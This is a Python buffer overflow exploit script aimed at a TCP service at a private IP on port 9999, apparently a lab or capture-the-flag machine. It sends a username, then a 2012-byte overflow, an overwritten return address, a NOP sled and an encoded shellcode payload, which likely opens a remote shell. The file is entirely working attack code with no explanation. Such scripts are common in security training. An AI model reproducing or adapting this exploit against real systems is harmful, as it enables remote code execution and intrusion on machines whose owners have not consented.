import socket

ip = "10.10.201.227"
port = 9999

user = "black"
offset = 2012
overflow = "A" * offset
retn = "\xdf\x14\x50\x62"
padding = "\x90" * 16
payload = "\xd9\xc5\xbf\xab\x42\x6e\xcf\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x52\x31\x7e\x17\x03\x7e\x17\x83\x6d\x46\x8c\x3a\x8d\xaf\xd2\xc5\x6d\x30\xb3\x4c\x88\x01\xf3\x2b\xd9\x32\xc3\x38\x8f\xbe\xa8\x6d\x3b\x34\xdc\xb9\x4c\xfd\x6b\x9c\x63\xfe\xc0\xdc\xe2\x7c\x1b\x31\xc4\xbd\xd4\x44\x05\xf9\x09\xa4\x57\x52\x45\x1b\x47\xd7\x13\xa0\xec\xab\xb2\xa0\x11\x7b\xb4\x81\x84\xf7\xef\x01\x27\xdb\x9b\x0b\x3f\x38\xa1\xc2\xb4\x8a\x5d\xd5\x1c\xc3\x9e\x7a\x61\xeb\x6c\x82\xa6\xcc\x8e\xf1\xde\x2e\x32\x02\x25\x4c\xe8\x87\xbd\xf6\x7b\x3f\x19\x06\xaf\xa6\xea\x04\x04\xac\xb4\x08\x9b\x61\xcf\x35\x10\x84\x1f\xbc\x62\xa3\xbb\xe4\x31\xca\x9a\x40\x97\xf3\xfc\x2a\x48\x56\x77\xc6\x9d\xeb\xda\x8f\x52\xc6\xe4\x4f\xfd\x51\x97\x7d\xa2\xc9\x3f\xce\x2b\xd4\xb8\x31\x06\xa0\x56\xcc\xa9\xd1\x7f\x0b\xfd\x81\x17\xba\x7e\x4a\xe7\x43\xab\xdd\xb7\xeb\x04\x9e\x67\x4c\xf5\x76\x6d\x43\x2a\x66\x8e\x89\x43\x0d\x75\x5a\x66\xd4\x6e\xbc\x1e\xda\x90\xd1\x82\x53\x76\xbb\x2a\x32\x21\x54\xd2\x1f\xb9\xc5\x1b\x8a\xc4\xc6\x90\x39\x39\x88\x50\x37\x29\x7d\x91\x02\x13\x28\xae\xb8\x3b\xb6\x3d\x27\xbb\xb1\x5d\xf0\xec\x96\x90\x09\x78\x0b\x8a\xa3\x9e\xd6\x4a\x8b\x1a\x0d\xaf\x12\xa3\xc0\x8b\x30\xb3\x1c\x13\x7d\xe7\xf0\x42\x2b\x51\xb7\x3c\x9d\x0b\x61\x92\x77\xdb\xf4\xd8\x47\x9d\xf8\x34\x3e\x41\x48\xe1\x07\x7e\x65\x65\x80\x07\x9b\x15\x6f\xd2\x1f\x35\x92\xf6\x55\xde\x0b\x93\xd7\x83\xab\x4e\x1b\xba\x2f\x7a\xe4\x39\x2f\x0f\xe1\x06\xf7\xfc\x9b\x17\x92\x02\x0f\x17\xb7"
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET for ipv4, sock_stream for tcp

try:
  s.connect((ip, port))
  s.send(bytes(user + "\r\n", "latin-1"))
  s.recv(1024)
  print("Sending buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1")) # have to add carriage return and new line.
  print("Done!")
except:
  print("Could not connect.")
